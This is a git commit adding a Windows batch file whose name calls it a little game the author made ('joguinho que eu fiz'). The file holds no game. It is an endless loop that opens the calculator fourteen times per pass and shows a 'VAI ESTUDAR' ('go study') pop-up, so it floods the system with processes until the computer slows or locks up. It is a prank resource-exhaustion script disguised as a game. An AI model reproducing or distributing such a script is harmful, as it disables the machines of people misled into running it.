0fb74f48ae4c81773afa4b2b04a4c9b5239d0c90
GMLolf <81660643+bebeninicicinininioooo@users.noreply.github.com>
2022-07-01 01:44:58 -0300

    Add files via upload

---
+++ joguinho que eu fiz #11.cmd
@@ -0,0 +1,18 @@
+:loop
+start calc
+start calc
+start calc
+start calc
+start calc
+start calc
+start calc
+start calc
+start calc
+start calc
+start calc
+start calc
+start calc
+start calc
+
+msg * VAI ESTUDAR
+goto loop
